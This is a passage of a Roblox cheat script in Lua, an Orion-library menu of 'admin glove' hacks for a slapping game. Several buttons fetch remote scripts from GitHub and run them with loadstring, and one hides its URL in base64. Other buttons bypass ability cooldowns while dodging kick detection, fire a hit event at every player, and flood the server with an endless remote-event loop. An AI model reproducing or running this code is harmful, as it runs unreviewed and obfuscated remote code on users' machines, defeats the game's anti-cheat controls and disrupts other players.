    Name = "Fe killer fish V2",
    Callback = function()
        getgenv().KillerfishSetting = {  
        KillerfishPower = 90,
        KillerfishNoCooldown = false
}

loadstring(game:HttpGet("https://raw.githubusercontent.com/KietVN02202/KietVN02202/refs/heads/main/FeKillerfish2.0.lua"))()
    end
})

Tab:AddButton({
    Name = "Minos prime V2",
    Callback = function()
        getgenv().MinosPrime = {  
        MinosPrimeSkipAnimation = false,
        MorphMinosPrime = true
    }  

loadstring(game:HttpGet("https://raw.githubusercontent.com/KietVN02202/KietVN02202/refs/heads/main/MinosPrimeFanMade2.0.lua"))()
    end
})

Tab:AddButton({
    Name = "Overseer glove",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/KietVN02202/KietVN02202/refs/heads/main/OVERSEERGlove.txt"))()
    end
})

Tab:AddButton({
    Name = "Fe edgelord V2",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/KietVN02202/KietVN02202/refs/heads/main/FeEdgelord2.0.lua"))()
    end
})

Tab:AddButton({
    Name = "Custom 500 killstreak",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/KietVN02202/KietVN02202/refs/heads/main/FEcustom500killstreak.lua"))()
    end
})

Section = Tab:AddSection({
    Name = "Kizzy"
})

Tab:AddButton({
    Name = "Despair",
    Callback = function()
        getgenv().NightMode = true

loadstring(request({
Url = base64_decode'aHR0cHM6Ly9naXRodWIuY29tL2tpenp5bG1mYW8vRGVzcGFpci9yYXcvcmVmcy9oZWFkcy9tYWluL0Rlc3BhaXJXSVA=',
Method = 'GET'
}).Body)()
    end
})

local Tab = Window:MakeTab({
    Name = "Admin Gloves",
    Icon = "rbxassetid://7733955740",
    PremiumOnly = false
})

Tab:AddParagraph("PC VERSION", "")

-- Section: BOOBLE
Section = Tab:AddSection({ Name = "BOOBLE" })

Tab:AddButton({
    Name = "BOOBLE",
    Callback = function()
        if game.Players.LocalPlayer.leaderstats.Glove.Value == "Bubble" then
            local player = game.Players.LocalPlayer
            local gui = player:WaitForChild("PlayerGui")

            -- Create the ScreenGui
            local screenGui = Instance.new("ScreenGui")
            screenGui.Name = "BoobleButton"
            screenGui.ResetOnSpawn = true
            screenGui.Parent = gui

            -- Create the Button
            local button = Instance.new("TextButton")
            button.Size = UDim2.new(0, 100, 0, 100)
            button.Position = UDim2.new(0, 1200, 0, 400)
            button.Text = "E"
            button.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
            button.TextColor3 = Color3.fromRGB(255, 255, 255)
            button.Font = Enum.Font.SourceSansBold
            button.TextSize = 60
            button.Parent = screenGui

            -- Cooldown logic
            local cooldown = false
            local cooldownTime = 1
            local updateRate = 0.05

            button.MouseButton1Click:Connect(function()
                if cooldown then return end
                game:GetService("ReplicatedStorage").BubbleThrow:FireServer()
                cooldown = true
                local timeLeft = cooldownTime
                while timeLeft > 0 do
                    button.Text = string.format("%.2f", timeLeft)
                    wait(updateRate)
                    timeLeft -= updateRate
                end
                button.Text = "E"
                cooldown = false
            end)

            -- UI Stroke (black outline)
            local stroke = Instance.new("UIStroke")
            stroke.Color = Color3.fromRGB(0, 0, 0)
            stroke.Thickness = 3
            stroke.Transparency = 0
            stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            stroke.Parent = button

            -- UICorner (rounded edges)
            local corner = Instance.new("UICorner")
            corner.CornerRadius = UDim.new(0, 9)
            corner.Parent = button
        else
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "Equip Bubble Glove To Work",
                Image = "rbxassetid://7743878857",
                Time = 3
            })
        end
    end
})

Tab:AddParagraph("How It Works?", "Uses Bubble Glove But Without Cooldown And It Creates E Button Where U Can Click To Use BOOBLE And There Will Be Cd Protection So U Wont Get Kicked")

-- Section: BoggieWoogie
Section = Tab:AddSection({ Name = "BoggieWoogie" })

Tab:AddButton({
    Name = "BoggieWoogie",
    Callback = function()
        if game.Players.LocalPlayer.leaderstats.Glove.Value == "Swapper" then
            local player = game.Players.LocalPlayer
            local gui = player:WaitForChild("PlayerGui")

            local screenGui = Instance.new("ScreenGui")
            screenGui.Name = "BoogieWoogieButton"
            screenGui.ResetOnSpawn = true
            screenGui.Parent = gui

            local button = Instance.new("TextButton")
            button.Size = UDim2.new(0, 100, 0, 100)
            button.Position = UDim2.new(0, 1200, 0, 400)
            button.Text = "E"
            button.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
            button.TextColor3 = Color3.fromRGB(255, 255, 255)
            button.Font = Enum.Font.SourceSansBold
            button.TextSize = 60
            button.Parent = screenGui

            local cooldown = false
            local cooldownTime = 1
            local updateRate = 0.05

            button.MouseButton1Click:Connect(function()
                if cooldown then return end
                game:GetService("ReplicatedStorage").SLOC:FireServer()
                cooldown = true
                local timeLeft = cooldownTime
                while timeLeft > 0 do
                    button.Text = string.format("%.2f", timeLeft)
                    wait(updateRate)
                    timeLeft -= updateRate
                end
                button.Text = "E"
                cooldown = false
            end)

            local stroke = Instance.new("UIStroke")
            stroke.Color = Color3.fromRGB(0, 0, 0)
            stroke.Thickness = 3
            stroke.Transparency = 0
            stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            stroke.Parent = button

            local corner = Instance.new("UICorner")
            corner.CornerRadius = UDim.new(0, 9)
            corner.Parent = button
        else
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "Equip Swapper Glove To Work",
                Image = "rbxassetid://7743878857",
                Time = 3
            })
        end
    end
})

Tab:AddParagraph("How It Works?", "Uses Swapper Glove But Without Cooldown And It Creates E Button Where U Can Click To Use BoggieWoogie And There Will Be Cd Protection So U Wont Get Kicked")

-- Section: Clone()
Section = Tab:AddSection({ Name = "Clone()" })

Tab:AddButton({
    Name = "Clone()",
    Callback = function()
        if game.Players.LocalPlayer.leaderstats.Glove.Value == "Replica" then
            local player = game.Players.LocalPlayer
            local gui = player:WaitForChild("PlayerGui")

            local screenGui = Instance.new("ScreenGui")
            screenGui.Name = "CloneButton"
            screenGui.ResetOnSpawn = true
            screenGui.Parent = gui

            local button = Instance.new("TextButton")
            button.Size = UDim2.new(0, 100, 0, 100)
            button.Position = UDim2.new(0, 1200, 0, 400)
            button.Text = "E"
            button.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
            button.TextColor3 = Color3.fromRGB(255, 255, 255)
            button.Font = Enum.Font.SourceSansBold
            button.TextSize = 60
            button.Parent = screenGui

            local cooldown = false
            local cooldownTime = 1
            local updateRate = 0.05

            button.MouseButton1Click:Connect(function()
                if cooldown then return end
                game:GetService("ReplicatedStorage").Duplicate:FireServer()
                cooldown = true
                local timeLeft = cooldownTime
                while timeLeft > 0 do
                    button.Text = string.format("%.2f", timeLeft)
                    wait(updateRate)
                    timeLeft -= updateRate
                end
                button.Text = "E"
                cooldown = false
            end)

            local stroke = Instance.new("UIStroke")
            stroke.Color = Color3.fromRGB(0, 0, 0)
            stroke.Thickness = 3
            stroke.Transparency = 0
            stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            stroke.Parent = button

            local corner = Instance.new("UICorner")
            corner.CornerRadius = UDim.new(0, 9)
            corner.Parent = button
        else
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "Equip Replica Glove To Work",
                Image = "rbxassetid://7743878857",
                Time = 3
            })
        end
    end
})

Tab:AddParagraph("How It Works?", "Uses Replica Glove But Without Cooldown And It Creates E Button Where U Can Click To Use Clone() And There Will Be Cd Protection So U Wont Get Kicked")

Section = Tab:AddSection({
    Name = "Edgelord"
})

Tab:AddButton({
    Name = "Edgelord",
    Callback = function()
        if game.Players.LocalPlayer.leaderstats.Glove.Value == "Dual" then
            local player = game.Players.LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoid = character:WaitForChild("Humanoid")

            -- Animation instances
            local idleAnim = Instance.new("Animation")
            idleAnim.AnimationId = "rbxassetid://16163355836"  -- Idle animation

            local walkAnim = Instance.new("Animation")
            walkAnim.AnimationId = "rbxassetid://16163350920"  -- Walking animation

            -- Load animations
            local idleTrack = humanoid:LoadAnimation(idleAnim)
            local walkTrack = humanoid:LoadAnimation(walkAnim)

            -- Function to update the animation based on walking or standing
            local function updateAnimation()
                if humanoid.WalkSpeed > 0 then
                    -- If the player is walking, play walking animation
                    if not walkTrack.IsPlaying then
                        walkTrack:Play()
                        idleTrack:Stop()  -- Stop idle animation if walking
                    end
                else
                    -- If the player is standing still, play idle animation
                    if not idleTrack.IsPlaying then
                        idleTrack:Play()
                        walkTrack:Stop()  -- Stop walking animation if standing still
                    end
                end
            end

            -- Continuously update the animation based on the player's state
            game:GetService("RunService").Heartbeat:Connect(function()
                updateAnimation()
            end)

            ----------------------------------------------------------------------------------------------------------------
            -- E BUTTON
            local gui = player:WaitForChild("PlayerGui")

            -- Create the ScreenGui
            local screenGui = Instance.new("ScreenGui")
            screenGui.Name = "EdgelordEButton"
            screenGui.ResetOnSpawn = true
            screenGui.Parent = gui

            -- Create the Button
            local buttonE = Instance.new("TextButton")
            buttonE.Size = UDim2.new(0, 100, 0, 100) -- Square shape
            buttonE.Position = UDim2.new(0, 1200, 0, 400)
            buttonE.Text = "E"
            buttonE.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
            buttonE.TextColor3 = Color3.fromRGB(255, 255, 255)
            buttonE.Font = Enum.Font.SourceSansBold
            buttonE.TextSize = 60
            buttonE.Parent = screenGui

            -- Cooldown logic
            local cooldown = false
            local cooldownTime = 0 -- seconds
            local updateRate = 0 -- how often to update display (smaller = smoother)

            buttonE.MouseButton1Click:Connect(function()
                if cooldown then return end

                -- Play Edgelord slap animation
                local animationId = "rbxassetid://17670135152"  -- The animation ID you provided

                local function playAnimation()
                    local character = player.Character or player.CharacterAdded:Wait()
                    local humanoid = character:WaitForChild("Humanoid")

                    -- Create the animation instance
                    local animation = Instance.new("Animation")
                    animation.AnimationId = animationId  -- Set the animation ID

                    -- Load the animation onto the humanoid
                    local animationTrack = humanoid:LoadAnimation(animation)

                    -- Play the animation
                    animationTrack:Play()
                end

                task.wait()  -- Optional wait to ensure character is fully loaded
                playAnimation()

                local Players = game:GetService("Players")
                local ReplicatedStorage = game:GetService("ReplicatedStorage")

                for _, player in pairs(Players:GetPlayers()) do
                    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                        local args = { [1] = player.Character.HumanoidRootPart }
                        ReplicatedStorage:WaitForChild("GeneralHit"):FireServer(unpack(args))
                    end
                end

                -- Start Cooldown
                cooldown = true
                local timeLeft = cooldownTime

                while timeLeft > 0 do
                    buttonE.Text = string.format("%.2f", timeLeft)
                    wait(updateRate)
                    timeLeft -= updateRate
                end

                -- Reset
                buttonE.Text = "E"
                cooldown = false
            end)

            -- Create UIStroke (black outline)
            local strokeE = Instance.new("UIStroke")
            strokeE.Color = Color3.fromRGB(0, 0, 0)
            strokeE.Thickness = 3
            strokeE.Transparency = 0
            strokeE.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            strokeE.Parent = buttonE

            -- UICorner (rounded edges with clean radius)
            local cornerE = Instance.new("UICorner")
            cornerE.CornerRadius = UDim.new(0, 9) -- 👈 Clean: scale 0, offset 9
            cornerE.Parent = buttonE

            ----------------------------------------------------------------------------------------------------------------
            -- R BUTTON
            -- Create the ScreenGui
            local screenGuiR = Instance.new("ScreenGui")
            screenGuiR.Name = "EdgelordRButton"
            screenGuiR.ResetOnSpawn = true
            screenGuiR.Parent = gui

            -- Create the Button
            local buttonR = Instance.new("TextButton")
            buttonR.Size = UDim2.new(0, 100, 0, 100) -- Square shape
            buttonR.Position = UDim2.new(0, 1200, 0, 295)
            buttonR.Text = "R"
            buttonR.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
            buttonR.TextColor3 = Color3.fromRGB(255, 255, 255)
            buttonR.Font = Enum.Font.SourceSansBold
            buttonR.TextSize = 60
            buttonR.Parent = screenGuiR

            -- Cooldown logic
            local cooldownR = false
            local cooldownTimeR = 0 -- seconds
            local updateRateR = 0 -- how often to update display (smaller = smoother)

            buttonR.MouseButton1Click:Connect(function()
                if cooldownR then return end

                -- Reset the player's character
                game.Players.LocalPlayer.Character.Humanoid.Health = 0

                -- Start Cooldown
                cooldownR = true
                local timeLeft = cooldownTimeR

                while timeLeft > 0 do
                    buttonR.Text = string.format("%.2f", timeLeft)
                    wait(updateRateR)
                    timeLeft -= updateRateR
                end

                -- Reset
                buttonR.Text = "R"
                cooldownR = false
            end)

            -- Create UIStroke (black outline)
            local strokeR = Instance.new("UIStroke")
            strokeR.Color = Color3.fromRGB(0, 0, 0)
            strokeR.Thickness = 3
            strokeR.Transparency = 0
            strokeR.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            strokeR.Parent = buttonR

            -- UICorner (rounded edges with clean radius)
            local cornerR = Instance.new("UICorner")
            cornerR.CornerRadius = UDim.new(0, 9)
            cornerR.Parent = buttonR

            ----------------------------------------------------------------------------------------------------------------
            -- T BUTTON
            local screenGuiT = Instance.new("ScreenGui")
            screenGuiT.Name = "EdgelordTButton"
            screenGuiT.ResetOnSpawn = true
            screenGuiT.Parent = gui

            local buttonT = Instance.new("TextButton")
            buttonT.Size = UDim2.new(0, 100, 0, 100)
            buttonT.Position = UDim2.new(0, 1305, 0, 295)
            buttonT.Text = "T"
            buttonT.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
            buttonT.TextColor3 = Color3.fromRGB(255, 255, 255)
            buttonT.Font = Enum.Font.SourceSansBold
            buttonT.TextSize = 60
            buttonT.Parent = screenGuiT

            local cooldownT = false
            local cooldownTimeT = 0
            local updateRateT = 0

            buttonT.MouseButton1Click:Connect(function()
                if cooldownT then return end

                local Players = game:GetService("Players")
                local player = Players.LocalPlayer

                local function teleportForward()
                    local character = player.Character or player.CharacterAdded:Wait()
                    local hrp = character:WaitForChild("HumanoidRootPart")

                    -- Get the direction the player is facing
                    local lookDirection = hrp.CFrame.LookVector.Unit

                    -- Move 20 studs in that direction
                    local offset = lookDirection * 20
                    local newPosition = hrp.Position + offset

                    -- Teleport the player forward
                    hrp.CFrame = CFrame.new(newPosition, newPosition + lookDirection)
                end

                teleportForward()

                cooldownT = true
                local timeLeft = cooldownTimeT

                while timeLeft > 0 do
                    buttonT.Text = string.format("%.2f", timeLeft)
                    wait(updateRateT)
                    timeLeft -= updateRateT
                end

                buttonT.Text = "T"
                cooldownT = false
            end)

            local strokeT = Instance.new("UIStroke")
            strokeT.Color = Color3.fromRGB(0, 0, 0)
            strokeT.Thickness = 3
            strokeT.Transparency = 0
            strokeT.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            strokeT.Parent = buttonT

            local cornerT = Instance.new("UICorner")
            cornerT.CornerRadius = UDim.new(0, 9)
            cornerT.Parent = buttonT

            ----------------------------------------------------------------------------------------------------------------
            -- F BUTTON
            local screenGuiF = Instance.new("ScreenGui")
            screenGuiF.Name = "EdgelordFButton"
            screenGuiF.ResetOnSpawn = true
            screenGuiF.Parent = gui

            local buttonF = Instance.new("TextButton")
            buttonF.Size = UDim2.new(0, 100, 0, 100)
            buttonF.Position = UDim2.new(0, 1305, 0, 400)
            buttonF.Text = "F"
            buttonF.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
            buttonF.TextColor3 = Color3.fromRGB(255, 255, 255)
            buttonF.Font = Enum.Font.SourceSansBold
            buttonF.TextSize = 60
            buttonF.Parent = screenGuiF

            local cooldownF = false
            local cooldownTimeF = 0
            local updateRateF = 0

            buttonF.MouseButton1Click:Connect(function()
                if cooldownF then return end

                if game.Players.LocalPlayer.leaderstats.Glove.Value == "Dual" or
                   game.Players.LocalPlayer.leaderstats.Glove.Value == "Kinetic" then

                    game.ReplicatedStorage.SelfKnockback:FireServer({
                        ["Force"] = 0,
                        ["Direction"] = Vector3.new(0, 0.01, 0)
                    })
                else
                    OrionLib:MakeNotification({
                        Name = "Error",
                        Content = "Equip Kinetic",
                        Image = "rbxassetid://7743878857",
                        Time = 3
                    })
                end

                cooldownF = true
                local timeLeft = cooldownTimeF

                while timeLeft > 0 do
                    buttonF.Text = string.format("%.2f", timeLeft)
                    wait(updateRateF)
                    timeLeft -= updateRateF
                end

                buttonF.Text = "F"
                cooldownF = false
            end)

            local strokeF = Instance.new("UIStroke")
            strokeF.Color = Color3.fromRGB(0, 0, 0)
            strokeF.Thickness = 3
            strokeF.Transparency = 0
            strokeF.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            strokeF.Parent = buttonF

            local cornerF = Instance.new("UICorner")
            cornerF.CornerRadius = UDim.new(0, 9)
            cornerF.Parent = buttonF

        else
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "Equip Dual Glove To Work",
                Image = "rbxassetid://7743878857",
                Time = 3
            })
        end
    end
})

Tab:AddParagraph(
    "How It Works?",
    "It Adds 4 Buttons E = Edgelord Slap (Need Dual Glove), T = Teleports 20 Studs Forward, F = Gives +1 Kinetic Aura (Need Kinetic Glove), R = Resets Player (you). That All Also Walk And Stand Animation Going To Be Changed To Edgelord And Edgelord's Slap Animation Also Going To Be Added"
)

Section = Tab:AddSection({
    Name = "Killerfish"
})

Tab:AddButton({
    Name = "Killerfish",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/KietVN02202/KietVN02202/refs/heads/main/Killerfish.txt"))()
    end
})

Tab:AddParagraph(
    "How It Works?",
    "Can Be Any Glove And E Ability Will Do Ability As Fish Glove But You Can Use With 0 Cd And Without Getting Kicked"
)

-- Minecraft Section
Section = Tab:AddSection({
    Name = "Minecraft"
})

Tab:AddButton({
    Name = "Minecraft",
    Callback = function()
        if game.Players.LocalPlayer.leaderstats.Glove.Value == "Brick" then
            local player = game.Players.LocalPlayer
            local gui = player:WaitForChild("PlayerGui")

            -- Create the ScreenGui
            local screenGui = Instance.new("ScreenGui")
            screenGui.Name = "MinecraftButton"
            screenGui.ResetOnSpawn = true
            screenGui.Parent = gui

            -- Create the Button
            local button = Instance.new("TextButton")
            button.Size = UDim2.new(0, 100, 0, 100) -- Square shape
            button.Position = UDim2.new(0, 1200, 0, 400)
            button.Text = "E"
            button.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
            button.TextColor3 = Color3.fromRGB(255, 255, 255)
            button.Font = Enum.Font.SourceSansBold
            button.TextSize = 60
            button.Parent = screenGui

            -- Cooldown logic
            local cooldown = false
            local cooldownTime = 1 -- seconds
            local updateRate = 0.05 -- update display rate

            button.MouseButton1Click:Connect(function()
                if cooldown then return end

                -- Fire the remote event
                game:GetService("ReplicatedStorage").lbrick:FireServer()

                -- Start cooldown
                cooldown = true
                local timeLeft = cooldownTime

                while timeLeft > 0 do
                    button.Text = string.format("%.2f", timeLeft)
                    wait(updateRate)
                    timeLeft -= updateRate
                end

                -- Reset button text and cooldown
                button.Text = "E"
                cooldown = false
            end)

            -- Button UI Stroke (black outline)
            local stroke = Instance.new("UIStroke")
            stroke.Color = Color3.fromRGB(0, 0, 0)
            stroke.Thickness = 3
            stroke.Transparency = 0
            stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            stroke.Parent = button

            -- Button UICorner (rounded edges)
            local corner = Instance.new("UICorner")
            corner.CornerRadius = UDim.new(0, 9)
            corner.Parent = button
        else
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "Equip Brick Glove To Work",
                Image = "rbxassetid://7743878857",
                Time = 3
            })
        end
    end
})

Tab:AddParagraph("How It Works?", "Uses Brick Glove But Without Cooldown And It Creates E Button Where U Can Click To Use Minecraft And There Will Be Cd Protection So U Wont Get Kicked")



-- Super Parry Section
Section = Tab:AddSection({
    Name = "Super Parry"
})

Tab:AddButton({
    Name = "Super Parry",
    Callback = function()
        if game.Players.LocalPlayer.leaderstats.Glove.Value == "Parry" then
            local player = game.Players.LocalPlayer
            local gui = player:WaitForChild("PlayerGui")

            -- Create the ScreenGui
            local screenGui = Instance.new("ScreenGui")
            screenGui.Name = "SuperParryButton"
            screenGui.ResetOnSpawn = true
            screenGui.Parent = gui

            -- Create the Button
            local button = Instance.new("TextButton")
            button.Size = UDim2.new(0, 100, 0, 100)
            button.Position = UDim2.new(0, 1200, 0, 400)
            button.Text = "E"
            button.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
            button.TextColor3 = Color3.fromRGB(255, 255, 255)
            button.Font = Enum.Font.SourceSansBold
            button.TextSize = 60
            button.Parent = screenGui

            -- Cooldown logic
            local cooldown = false
            local cooldownTime = 1
            local updateRate = 0.05

            button.MouseButton1Click:Connect(function()
                if cooldown then return end

                -- Fire the remote event
                game:GetService("ReplicatedStorage").GeneralAbility:FireServer()

                -- Start cooldown
                cooldown = true
                local timeLeft = cooldownTime

                while timeLeft > 0 do
                    button.Text = string.format("%.2f", timeLeft)
                    wait(updateRate)
                    timeLeft -= updateRate
                end

                -- Reset button text and cooldown
                button.Text = "E"
                cooldown = false
            end)

            -- UIStroke for button
            local stroke = Instance.new("UIStroke")
            stroke.Color = Color3.fromRGB(0, 0, 0)
            stroke.Thickness = 3
            stroke.Transparency = 0
            stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            stroke.Parent = button

            -- UICorner for button
            local corner = Instance.new("UICorner")
            corner.CornerRadius = UDim.new(0, 9)
            corner.Parent = button
        else
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "Equip Parry Glove To Work",
                Image = "rbxassetid://7743878857",
                Time = 3
            })
        end
    end
})

Tab:AddParagraph("How It Works?", "Uses Parry Glove But Without Cooldown And It Creates E Button Where U Can Click To Use Super Parry And There Will Be Cd Protection So U Wont Get Kicked")



-- Tableflip Section
Section = Tab:AddSection({
    Name = "TABLE"
})

Tab:AddButton({
    Name = "TABLE",
    Callback = function()
        if game.Players.LocalPlayer.leaderstats.Glove.Value == "Tableflip" then
            local player = game.Players.LocalPlayer
            local gui = player:WaitForChild("PlayerGui")

            -- Create the ScreenGui
            local screenGui = Instance.new("ScreenGui")
            screenGui.Name = "TABLEButton"
            screenGui.ResetOnSpawn = true
            screenGui.Parent = gui

            -- Create the Button
            local button = Instance.new("TextButton")
            button.Size = UDim2.new(0, 100, 0, 100)
            button.Position = UDim2.new(0, 1200, 0, 400)
            button.Text = "E"
            button.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
            button.TextColor3 = Color3.fromRGB(255, 255, 255)
            button.Font = Enum.Font.SourceSansBold
            button.TextSize = 60
            button.Parent = screenGui

            -- Cooldown logic
            local cooldown = false
            local cooldownTime = 1
            local updateRate = 0.05

            button.MouseButton1Click:Connect(function()
                if cooldown then return end

                -- Fire the remote event
                game:GetService("ReplicatedStorage").GeneralAbility:FireServer()

                -- Start cooldown
                cooldown = true
                local timeLeft = cooldownTime

                while timeLeft > 0 do
                    button.Text = string.format("%.2f", timeLeft)
                    wait(updateRate)
                    timeLeft -= updateRate
                end

                -- Reset button text and cooldown
                button.Text = "E"
                cooldown = false
            end)

            -- UIStroke for button
            local stroke = Instance.new("UIStroke")
            stroke.Color = Color3.fromRGB(0, 0, 0)
            stroke.Thickness = 3
            stroke.Transparency = 0
            stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            stroke.Parent = button

            -- UICorner for button
            local corner = Instance.new("UICorner")
            corner.CornerRadius = UDim.new(0, 9)
            corner.Parent = button
        else
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "Equip Tableflip Glove To Work",
                Image = "rbxassetid://7743878857",
                Time = 3
            })
        end
    end
})

Tab:AddParagraph("How It Works?", "Uses Tableflip Glove But Without Cooldown And It Creates E Button Where U Can Click To Use TABLE And There Will Be Cd Protection So U Wont Get Kicked")



-- Run Mastered (TERRY) Section
Section = Tab:AddSection({
    Name = "TERRY"
})

Tab:AddButton({
    Name = "TERRY",
    Callback = function()
        if game.Players.LocalPlayer.leaderstats.Glove.Value == "Run" then
            local player = game.Players.LocalPlayer
            local gui = player:WaitForChild("PlayerGui")

            -- Create the ScreenGui
            local screenGui = Instance.new("ScreenGui")
            screenGui.Name = "TERRYButton"
            screenGui.ResetOnSpawn = true
            screenGui.Parent = gui

            -- Create the Button
            local button = Instance.new("TextButton")
            button.Size = UDim2.new(0, 100, 0, 100)
            button.Position = UDim2.new(0, 1200, 0, 400)
            button.Text = "E"
            button.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
            button.TextColor3 = Color3.fromRGB(255, 255, 255)
            button.Font = Enum.Font.SourceSansBold
            button.TextSize = 60
            button.Parent = screenGui

            -- Cooldown logic
            local cooldown = false
            local cooldownTime = 5
            local updateRate = 0.05

            button.MouseButton1Click:Connect(function()
                if cooldown then return end

                -- Fire the remote event
                game:GetService("ReplicatedStorage").RunMasteryAbility:FireServer()

                -- Start cooldown
                cooldown = true
                local timeLeft = cooldownTime

                while timeLeft > 0 do
                    button.Text = string.format("%.2f", timeLeft)
                    wait(updateRate)
                    timeLeft -= updateRate
                end

                -- Reset button text and cooldown
               
                button.Text = "E"
                cooldown = false
                end)

                        -- UIStroke for button
        local stroke = Instance.new("UIStroke")
        stroke.Color = Color3.fromRGB(0, 0, 0)
        stroke.Thickness = 3
        stroke.Transparency = 0
        stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
        stroke.Parent = button

        -- UICorner for button
        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0, 9)
        corner.Parent = button
    else
        OrionLib:MakeNotification({
            Name = "Error",
            Content = "Equip Run Mastered Glove To Work",
            Image = "rbxassetid://7743878857",
            Time = 3
        })
    end
end
})

Tab:AddParagraph("How It Works?", "Uses Run Mastered Glove But Without Cooldown And It Creates E Button Where U Can Click To Use TERRY And There Will Be Cd Protection So U Wont Get Kicked")

Section = Tab:AddSection({
    Name = "Train"
})

-- Normal Train Button
Tab:AddButton({
    Name = "Train",
    Callback = function()
        if game.Players.LocalPlayer.leaderstats.Glove.Value == "bus" then
            local player = game.Players.LocalPlayer
            local gui = player:WaitForChild("PlayerGui")

            -- Create the ScreenGui
            local screenGui = Instance.new("ScreenGui")
            screenGui.Name = "TrainButton"
            screenGui.ResetOnSpawn = true
            screenGui.Parent = gui

            -- Create the Button
            local button = Instance.new("TextButton")
            button.Size = UDim2.new(0, 100, 0, 100)
            button.Position = UDim2.new(0, 1200, 0, 400)
            button.Text = "E"
            button.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
            button.TextColor3 = Color3.fromRGB(255, 255, 255)
            button.Font = Enum.Font.SourceSansBold
            button.TextSize = 60
            button.Parent = screenGui

            -- Cooldown logic
            local cooldown = false
            local cooldownTime = 1
            local updateRate = 0.05

            button.MouseButton1Click:Connect(function()
                if cooldown then return end

                -- Fire the Remote
                game:GetService("ReplicatedStorage").busmoment:FireServer()

                -- Start Cooldown
                cooldown = true
                local timeLeft = cooldownTime
                while timeLeft > 0 do
                    button.Text = string.format("%.2f", timeLeft)
                    wait(updateRate)
                    timeLeft -= updateRate
                end

                -- Reset
                button.Text = "E"
                cooldown = false
            end)

            -- UIStroke
            local stroke = Instance.new("UIStroke")
            stroke.Color = Color3.fromRGB(0, 0, 0)
            stroke.Thickness = 3
            stroke.Transparency = 0
            stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            stroke.Parent = button

            -- UICorner
            local corner = Instance.new("UICorner")
            corner.CornerRadius = UDim.new(0, 9)
            corner.Parent = button
        else
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "Equip Bus Glove To Work",
                Image = "rbxassetid://7743878857",
                Time = 3
            })
        end
    end
})

-- Train (Kicks) Button
Tab:AddButton({
    Name = "Train (Kicks)",
    Callback = function()
        if game.Players.LocalPlayer.leaderstats.Glove.Value == "bus" then
            local player = game.Players.LocalPlayer
            local gui = player:WaitForChild("PlayerGui")

            -- Create the ScreenGui
            local screenGui = Instance.new("ScreenGui")
            screenGui.Name = "CloneButton"
            screenGui.ResetOnSpawn = true
            screenGui.Parent = gui

            -- Create the Button
            local button = Instance.new("TextButton")
            button.Size = UDim2.new(0, 100, 0, 100)
            button.Position = UDim2.new(0, 1200, 0, 400)
            button.Text = "E"
            button.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
            button.TextColor3 = Color3.fromRGB(255, 255, 255)
            button.Font = Enum.Font.SourceSansBold
            button.TextSize = 60
            button.Parent = screenGui

            -- Cooldown logic
            local cooldown = false
            local cooldownTime = 1
            local updateRate = 0.05

            button.MouseButton1Click:Connect(function()
                if cooldown then return end

                -- Fire the Remote Repeatedly (May Kick)
                while true do
                    game:GetService("ReplicatedStorage").busmoment:FireServer()
                    task.wait()
                end

                -- Start Cooldown (will never run because of infinite loop)
                cooldown = true
                local timeLeft = cooldownTime
                while timeLeft > 0 do
                    button.Text = string.format("%.2f", timeLeft)
                    wait(updateRate)
                    timeLeft -= updateRate
                end

                -- Reset
                button.Text = "E"
                cooldown = false
            end)

            -- UIStroke
            local stroke = Instance.new("UIStroke")
            stroke.Color = Color3.fromRGB(0, 0, 0)
            stroke.Thickness = 3
            stroke.Transparency = 0
            stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            stroke.Parent = button

            -- UICorner
            local corner = Instance.new("UICorner")
            corner.CornerRadius = UDim.new(0, 9)
            corner.Parent = button
        else
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "Equip Bus Glove To Work",
                Image = "rbxassetid://7743878857",
                Time = 3
            })
        end
    end
})

-- Description Paragraphs
Tab:AddParagraph("How It Works?", "Uses Bus Glove But Without Cooldown And It Creates E Button Where U Can Click To Use BoggieWoogie And There Will Be Cd Protection So U Wont Get Kicked")
Tab:AddParagraph("Or", "")
Tab:AddParagraph("How It Works?", "Uses Bus Glove But With E Button And When U Click Its Gonna Spawn Like 100 Busses But U Get Kicked")

Tab:AddParagraph("MOBILE VERSION", "")

-- Section: BOOBLE
Section = Tab:AddSection({ Name = "BOOBLE" })

Tab:AddButton({
